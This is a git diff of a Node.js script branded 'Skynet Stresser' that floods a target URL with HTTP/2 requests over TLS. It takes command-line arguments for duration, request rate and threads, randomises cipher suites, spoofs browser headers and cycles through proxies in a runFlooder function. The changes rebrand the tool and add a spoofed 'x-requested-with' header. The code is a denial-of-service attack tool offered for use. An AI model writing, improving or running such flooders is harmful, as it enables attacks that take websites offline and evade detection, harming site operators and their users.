@@ -1,3 +1,9 @@
+/**
+ * 
+ * @Http2 Whit Tls 1.3 by Skynet Stresser
+ * 
+ */
+
  const net = require("net");
  const http2 = require("http2");
  const tls = require("tls");
@@ -9,7 +15,7 @@
  process.setMaxListeners(0);
  require("events").EventEmitter.defaultMaxListeners = 0;
 
- if (process.argv.length < 5){console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 8 1`); process.exit();}
+ if (process.argv.length < 5){console.log(`Usage: node SKYNET-TLS.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 8 1`); process.exit();}
  
  const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
  const ciphers = "GREASE:" + [
@@ -155,6 +161,7 @@
  headers["sec-fetch-mode"] = "navigate";
  headers["sec-fetch-site"] = "same-origin";
  headers["upgrade-insecure-requests"] = "1";
+ headers["x-requested-with"] = "XMLHttpRequest";
  
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
